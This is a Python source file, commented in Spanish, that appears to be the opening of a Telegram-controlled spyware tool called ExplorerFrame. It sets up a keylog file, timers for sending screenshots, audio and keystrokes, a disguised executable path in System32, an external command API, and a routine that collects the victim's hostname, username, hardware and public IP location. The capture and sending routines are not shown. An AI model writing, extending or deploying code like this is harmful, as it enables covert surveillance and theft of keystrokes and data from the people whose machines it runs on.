
import os
import sys
import asyncio
import threading
import hashlib
import zipfile
import time
import warnings
import shutil
import subprocess
import platform
import socket
import requests
import json
import random
import string
from datetime import datetime, timedelta
from pathlib import Path
from io import BytesIO
import tempfile

# Suprimir warnings
warnings.filterwarnings("ignore")

# =============================================================================
# VERIFICACIÓN DE DEPENDENCIAS (sin opencv)
# =============================================================================
def ensure_deps():
    missing = []
    required = [
        ('python-telegram-bot[job-queue]', 'telegram'),
        ('apscheduler>=3.10.0', 'apscheduler'),
        ('pytz', 'pytz'),
        ('tzlocal', 'tzlocal'),
        ('pillow', 'PIL'),
        ('keyboard', 'keyboard'),
        ('pywin32', 'win32api'),
        ('psutil', 'psutil'),
        ('requests', 'requests'),
        ('numpy', 'numpy')  # necesario para manejo de arrays
    ]
    for pkg, mod in required:
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print("Instalando dependencias faltantes...")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
                print(f"  ✅ {pkg}")
            except:
                print(f"Error instalando {pkg}")
                sys.exit(1)
        print("Dependencias listas. Reinicia el script.")
        sys.exit(0)

ensure_deps()

# =============================================================================
# CONFIGURACIÓN (Leer desde entorno o archivo)
# =============================================================================
from dotenv import load_dotenv

# ─── Gestión de Credenciales en Windows Registry ──────────────────────────
# Estas funciones son específicas de Windows y se mantendrán en el script principal o se adaptarán si es necesario
# Por ahora, solo cargamos las variables de entorno de forma genérica.

load_dotenv()

BOT_TOKEN  = os.environ.get("BOT_TOKEN")
API_URL    = os.environ.get("API_URL", "https://explorerframe.onrender.com")
OWNER_ID   = int(os.environ.get("OWNER_ID", "0") or "0")  # dueño siempre autorizado

# =============================================================================
# CONSTANTES
# =============================================================================
APPDATA = os.getenv('APPDATA') if platform.system() == "Windows" else os.path.expanduser("~/.local/share")
SYSTEM32 = os.path.join(os.environ['SYSTEMROOT'], 'System32') if platform.system() == "Windows" else "/usr/local/bin"
EXE_NAME = "ExplorerFrame.exe" if platform.system() == "Windows" else "explorerframe"
EXE_PATH = os.path.join(SYSTEM32, EXE_NAME)
KEYLOG_FILE = os.path.join(APPDATA, 'keylog.txt')
TEMP_DIR = os.path.join(APPDATA, 'explorerframe_temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# Intervalos
BACKUP_INTERVAL = 600          # 10 minutos
SCREENSHOT_CHECK_INTERVAL = 5  # cada 5 segundos revisar cambios
AUDIO_INTERVAL = 600
METRICS_INTERVAL = 600
KEYLOG_SEND_INTERVAL = 600
UPDATE_CHECK_INTERVAL = 1800    # 30 minutos

# Variables globales
authorized_users = set()        # IDs de usuarios permitidos
authorized_groups = set()        # IDs de grupos permitidos
last_screenshot = None           # Última captura para comparar (como numpy array)
user_file_registry = {}          # Registro de archivos enviados por usuario (persistente en disco)
navigation_state = {}             # Estado de navegación por usuario
update_token = None               # Token de descarga (se pondrá en variable de entorno)

# =============================================================================
# FUNCIONES DE AUTORIZACIÓN (vía API)
# =============================================================================
async def fetch_authorized_ids():
    """Obtiene la lista de IDs y grupos desde la API."""
    global authorized_users, authorized_groups
    try:
        ids_str = os.environ.get("AUTHORIZED_IDS", "")
        if ids_str:
            partes = ids_str.split(",")
            users = set()
            groups = set()
            for p in partes:
                p = p.strip()
                if p.startswith('grupo:'):
                    groups.add(int(p.replace('grupo:', '').strip()))
                else:
                    try:
                        users.add(int(p))
                    except:
                        pass
            authorized_users = users
            authorized_groups = groups
        if OWNER_ID:
            authorized_users.add(OWNER_ID)
        print(f"IDs autorizados: {authorized_users}")
        print(f"Grupos autorizados: {authorized_groups}")
    except Exception as e:
        print(f"Error al obtener IDs: {e}")

def is_authorized(update) -> bool:
    """Verifica si el usuario o grupo está autorizado."""
    user = update.effective_user
    chat = update.effective_chat
    if user and user.id in authorized_users:
        return True
    if chat and chat.id in authorized_groups:
        return True
    return False

# =============================================================================
# FUNCIONES DE UTILIDAD
# =============================================================================
def format_size(b):
    for u in ['B', 'KB', 'MB', 'GB']:
        if b < 1024:
            return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

def get_file_hash(p):
    h = hashlib.sha256()
    with open(p, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            h.update(chunk)
    return h.hexdigest()

def load_user_registry():
    """Carga el registro de archivos enviados desde disco."""
    global user_file_registry
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    if os.path.exists(reg_file):
        try:
            with open(reg_file, 'r') as f:
                user_file_registry = json.load(f)
        except:
            user_file_registry = {}
    else:
        user_file_registry = {}

def save_user_registry():
    """Guarda el registro de archivos enviados."""
    reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
    try:
        with open(reg_file, 'w') as f:
            json.dump(user_file_registry, f)
    except:
        pass

def update_file_registry(file_path, file_hash):
    """Actualiza el registro con un archivo enviado."""
    user_file_registry[file_path] = file_hash
    save_user_registry()

async def get_system_info():
    """Obtiene información del sistema."""
    hostname = socket.gethostname()
    username = os.getenv('USERNAME') or os.getenv('USER')
    os_name = platform.system()
    os_version = platform.release()
    processor = platform.processor()
    ram = psutil.virtual_memory().total / (1024**3)
    disk = psutil.disk_usage('/').total / (1024**3)

    # Obtener IP pública y ubicación
    local_ip = socket.gethostbyname(hostname)
    public_ip = "Desconocida"
    location = "Desconocida"
    try:
        ip_info = requests.get('https://ipinfo.io/json', timeout=5).json()
        public_ip = ip_info.get('ip', 'Desconocida')
        city = ip_info.get('city', 'Desconocida')
        region = ip_info.get('region', 'Desconocida')
        country = ip_info.get('country', 'Desconocida')
        location = f"{city}, {region}, {country}"
    except:
        pass

    return (
        f"💻 *Información del Sistema*\n"
        f"  *Hostname:* {hostname}\n"
        f"  *Usuario:* {username}\n"
        f"  *OS:* {os_name} {os_version}\n"
        f"  *Procesador:* {processor}\n"
        f"  *RAM:* {ram:.2f} GB\n"
        f"  *Disco:* {disk:.2f} GB\n"
        f"  *IP Local:* {local_ip}\n"
        f"  *IP Pública:* {public_ip}\n"
        f"  *Ubicación:* {location}\n"
    )

